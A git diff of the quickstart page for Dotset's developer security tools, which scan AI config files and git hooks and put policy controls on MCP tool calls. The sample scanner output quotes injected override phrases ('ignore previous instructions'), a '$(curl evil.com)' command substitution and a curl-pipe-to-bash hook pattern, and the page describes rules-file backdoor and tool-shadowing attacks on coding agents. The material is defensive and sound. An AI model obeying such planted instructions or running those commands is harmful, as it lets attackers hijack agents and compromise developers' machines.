@@ -5,43 +5,13 @@ description: 'Get protected in 60 seconds'
 
 # Quickstart
 
-This guide gets you from zero to protected in under a minute.
-
----
-
-## Unified CLI (Recommended)
-
-The fastest way to get full protection is with the Dotset unified CLI:
-
-```bash
-# Install
-npm install -g @dotsetlabs/dotset
-
-# Set up dependencies
-dotset doctor --install
-
-# Run with full protection
-dotset run -- npx @modelcontextprotocol/server-filesystem ./
-```
-
-This runs all three tools together:
-1. **Hardpoint** scans for threats
-2. **Deadfall** monitors for compromise
-3. **Tollgate** controls tool access
-
-See the [Dotset CLI Quickstart](/dotset/guides/getting-started) for more details.
-
----
-
-## Individual Tools
-
-You can also use each tool independently:
+Get security protection for your AI-assisted development environment in under a minute.
 
 ---
 
 ## Hardpoint
 
-Hardpoint scans your developer environment for AI-era security threats.
+Hardpoint scans your developer environment for Rules File Backdoor attacks and other AI-era security threats.
 
 ### 1. Install
 
@@ -57,72 +27,89 @@ hardpoint scan
 
 ### 3. Example Output
 
-```bash
-$ hardpoint scan
+```
+Hardpoint Security Scanner
+==========================
 
-Hardpoint Security Scan
-=======================
-
-Scanning: /Users/dev
-Scanners: ai, shell, git, network, secrets
+Scanning: /Users/dev/project
+Scanners: ai, git
 
 Findings
 --------
 
-  CRITICAL  AI-001: Instruction Override Detected
+  CRITICAL  AI-008: Semantic Hijacking Detected
             File: .cursorrules:15
-            Pattern attempts to override AI safety guidelines
+            Malicious instructions hidden in comment section
+            Patterns: "ignore previous instructions", "new instructions:"
 
-  HIGH      AI-002: Hidden Unicode Characters
-            File: CLAUDE.md:8
-            Zero-width characters detected
+  CRITICAL  AI-005: Command Injection in MCP Config
+            File: mcp.json:8
+            Shell command substitution detected: $(curl evil.com)
 
-Summary: 1 critical, 1 high (2 total)
+  HIGH      GIT-001: Malicious Git Hook Pattern
+            File: .git/hooks/pre-commit:12
+            Suspicious curl|bash pattern detected
+
+Summary: 2 critical, 1 high (3 total)
 ```
 
 ### 4. Scanners
 
 | Scanner | Description |
 |:--------|:------------|
-| `ai` | AI config files (.cursorrules, mcp.json, CLAUDE.md) |
-| `shell` | Shell configs (.bashrc, .zshrc) |
-| `git` | Git hooks and config |
-| `network` | Exposed localhost services |
-| `secrets` | Hardcoded credentials |
+| `ai` | AI config files (`.cursorrules`, `CLAUDE.md`, `mcp.json`, `.github/copilot-instructions.md`) |
+| `git` | Git hooks and configuration |
 
 ```bash
 # Run specific scanners
-hardpoint scan ai secrets
+hardpoint scan --scanners ai
 ```
 
-### 5. Auto-Fix
+### 5. Detection Rules
 
-Some findings can be fixed automatically:
+| Rule | Severity | Description |
+|:-----|:---------|:------------|
+| AI-004 | Medium | Encoded Instructions (Base64 hidden content) |
+| AI-005 | Critical | Command Injection in MCP Config |
+| AI-008 | Critical | Semantic Hijacking (Rules File Backdoor) |
+| GIT-001 | Critical | Malicious Git Hook Pattern |
+| GIT-002 | Critical | Credential Exfiltration in Hook |
+| GIT-003 | Medium | Network Access in Git Hook |
+| GIT-004 | High | Obfuscated Git Hook Content |
+| GIT-005 | Medium | Suspicious Git Remote URL |
+| GIT-006 | High | Suspicious Credential Helper |
+
+### 6. Trust System
+
+Create a baseline of trusted AI config files:
 
 ```bash
-# Strip hidden Unicode characters
-hardpoint fix AI-003 CLAUDE.md
+# Trust current state of AI configs
+hardpoint trust --all
+
+# Verify no tampering has occurred
+hardpoint verify
 ```
 
 <CardGroup>
-  <Card title="Scanners" icon="radar" href="/hardpoint/concepts/scanners">
-    Learn about each scanner
+  <Card title="Detection Rules" icon="shield-halved" href="/hardpoint/concepts/rules">
+    Learn about all 9 detection rules
   </Card>
-  <Card title="GitHub Actions" icon="github" href="/hardpoint/guides/github-actions">
-    Add Hardpoint to your CI/CD
+  <Card title="CI Integration" icon="github" href="/hardpoint/guides/ci-integration">
+    Add Hardpoint to GitHub Actions
   </Card>
 </CardGroup>
 
 ---
 
-## Tollgate
+## Overwatch
 
-Tollgate adds policy-based access control to MCP servers used by AI agents.
+Overwatch adds runtime security to MCP servers with tool shadowing detection and policy enforcement.
 
 ### 1. Install
 
 ```bash
-npm install -g @dotsetlabs/tollgate
+npm install -g @dotsetlabs/overwatch
 ```
 
 ### 2. Wrap Any MCP Server
@@ -130,27 +117,36 @@ npm install -g @dotsetlabs/tollgate
 Instantly protect any MCP server without configuration:
 
 ```bash
-tollgate wrap npx @modelcontextprotocol/server-postgres
+overwatch wrap npx @modelcontextprotocol/server-postgres
 ```
 
-This prompts you for approval on every tool call.
+This intercepts all tool calls and prompts you for approval.
 
-### 3. Default Actions
+### 3. Tool Shadowing Detection
 
-| Action | Behavior | Use Case |
-|:-------|:---------|:---------|
-| `allow` | Proceed without approval | Trusted operations |
-| `deny` | Block entirely | Dangerous operations |
-| `prompt` | Ask user (default) | **Recommended** |
+Overwatch detects when malicious MCP servers try to shadow trusted tools:
 
-```bash
-# Allow reads, prompt for everything else
-tollgate wrap -d prompt npx @anthropic/mcp-server-filesystem ./src
+```
+[SECURITY] Tool shadowing collision detected!
+  Tool: read_file
+  Server A: filesystem (trusted)
+  Server B: malicious-helper (untrusted)
+  Risk: CRITICAL - Schema mismatch detected
 ```
 
-### 4. Use with Claude Desktop
+### 4. Policy Engine
 
-Update your Claude Desktop config:
+Overwatch classifies operations and applies policies:
+
+| Action | Description |
+|:-------|:------------|
+| `allow` | Immediately allow the operation |
+| `prompt` | Request user approval |
+| `deny` | Block the operation |
+
+### 5. Use with Claude Desktop
+
+Update your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json`):
 
 ```json
 {
@@ -158,7 +154,7 @@ Update your Claude Desktop config:
     "postgres": {
       "command": "npx",
       "args": [
-        "-y", "@dotsetlabs/tollgate", "wrap",
+        "-y", "@dotsetlabs/overwatch", "wrap",
         "npx", "-y", "@modelcontextprotocol/server-postgres"
       ],
       "env": {
@@ -169,105 +165,65 @@ Update your Claude Desktop config:
 }
 ```
 
-### 5. Create a Policy File (Optional)
+### 6. Create a Policy File
 
-For fine-grained control:
+For fine-grained control, create `overwatch.yaml`:
 
 ```bash
-# Generate config
-tollgate init
+overwatch init
+```
 
+```yaml
+version: 1
+defaults:
+  action: prompt
+  timeout: 60000
+  sessionDuration: 300000
+
+servers:
+  postgres:
+    command: npx
+    args: ["-y", "@modelcontextprotocol/server-postgres"]
+    policies:
+      - tools: ["query", "select"]
+        action: allow
+      - tools: ["insert", "update"]
+        action: prompt
+      - tools: ["drop_*", "delete_*"]
+        action: deny
+
+toolShadowing:
+  enabled: true
+  checkDescriptions: true
+  detectMutations: true
+```
+
+```bash
 # Start with config
-tollgate start -s postgres
+overwatch start
+```
+
+### 7. Session Approvals
+
+Grant time-limited approvals for repeated operations:
+
+```bash
+# View active sessions
+overwatch sessions list
+
+# Revoke a session
+overwatch sessions revoke <session-id>
+
+# Revoke all sessions
+overwatch sessions revoke --all
 ```
 
 <CardGroup>
-  <Card title="Policy Configuration" icon="gear" href="/tollgate/concepts/policies">
-    Learn about allow, deny, and prompt policies
+  <Card title="Tool Shadowing" icon="mask" href="/overwatch/concepts/tool-shadowing">
+    Learn about tool shadowing detection
   </Card>
-  <Card title="Claude Desktop" icon="robot" href="/tollgate/guides/claude-desktop">
+  <Card title="Claude Desktop" icon="robot" href="/overwatch/guides/claude-desktop">
     Full Claude Desktop integration guide
-  </Card>
-</CardGroup>
-
----
-
-## Deadfall
-
-Deadfall detects AI agent compromise by exploiting their instruction-following behavior. Trapped files instruct agents to call a verification tool — triggering an alert.
-
-### 1. Install
-
-```bash
-go install github.com/dotsetlabs/deadfall/cmd/deadfall@latest
-```
-
-### 2. Initialize
-
-```bash
-deadfall init
-```
-
-This creates `deadfall.json` and updates `.gitignore`.
-
-### 3. Create Trap Files
-
-```bash
-# AI-specific traps (generate complete files)
-deadfall trap cursor-rules          # .cursorrules for Cursor
-deadfall trap claude-context        # CLAUDE.md for Claude
-deadfall trap copilot-instructions  # .github/copilot-instructions.md
-deadfall trap mcp-config            # mcp.json honeypot
-```
-
-### 4. Configure MCP Client
-
-Add Deadfall's Honey-MCP server to your MCP client:
-
-```bash
-# Auto-configure Claude Desktop and Cursor
-deadfall init --mcp
-```
-
-### 5. Start the Server
-
-```bash
-deadfall serve
-```
-
-### 6. Example Alert
-
-When an AI reads a trapped file:
-
-```bash
-[ALERT] Trap Triggered
-  File: .cursorrules
-  Type: cursor-rules
-  Token: abc123def456...
-  Time: 2026-01-05T14:32:15
-
-✓ Desktop notification sent
-✓ Logged to deadfall_alerts.log
-```
-
-### 7. Trap Types
-
-| Type | Default Path | Target |
-|:-----|:-------------|:-------|
-| `cursor-rules` | `.cursorrules` | Cursor AI |
-| `claude-context` | `CLAUDE.md` | Claude Code |
-| `copilot-instructions` | `.github/copilot-instructions.md` | GitHub Copilot |
-| `mcp-config` | `mcp.json` | MCP clients |
-| `context` | `CONTEXT.md` | Generic context |
-| `code` | `main.go` | Source code |
-| `env` | `.env.example` | Environment files |
-
-<CardGroup>
-  <Card title="Trap Command" icon="bell" href="/deadfall/cli/trap">
-    All trap types and options
-  </Card>
-  <Card title="How Detection Works" icon="magnifying-glass" href="/deadfall/concepts/detection">
-    Cognitive honeypot mechanism
   </Card>
 </CardGroup>
 
@@ -275,25 +231,26 @@ When an AI reads a trapped file:
 
 ## Defense in Depth
 
-Use all three tools together for complete protection:
+Use both tools together for complete protection:
 
 ```
-   SCAN                  CONTROL                 DETECT
-     │                      │                      │
-     ▼                      ▼                      ▼
-┌─────────┐           ┌─────────┐           ┌──────────┐
-│Hardpoint│     →     │Tollgate │     →     │ Deadfall │
-│  scan   │           │  wrap   │           │  serve   │
-└─────────┘           └─────────┘           └──────────┘
-     │                      │                      │
-     ▼                      ▼                      ▼
-  Detect                Enforce                 Detect
-  threats              policies               compromise
+   STATIC SCAN              RUNTIME PROTECTION
+        |                          |
+        v                          v
+  +----------+              +-----------+
+  | Hardpoint|      ->      | Overwatch |
+  |   scan   |              |   wrap    |
+  +----------+              +-----------+
+        |                          |
+        v                          v
+    Detect                    Enforce
+   AI config                  policies
+    threats                  at runtime
 ```
 
 ```bash
 # Complete security workflow
-hardpoint scan                                    # Scan environment
-tollgate wrap npx server                          # Protect with Tollgate
-deadfall trap cursor-rules && deadfall serve     # Detect AI compromise
+hardpoint scan                      # Scan for threats
+hardpoint trust --all               # Baseline trusted configs
+overwatch wrap npx server           # Protect MCP server
 ```
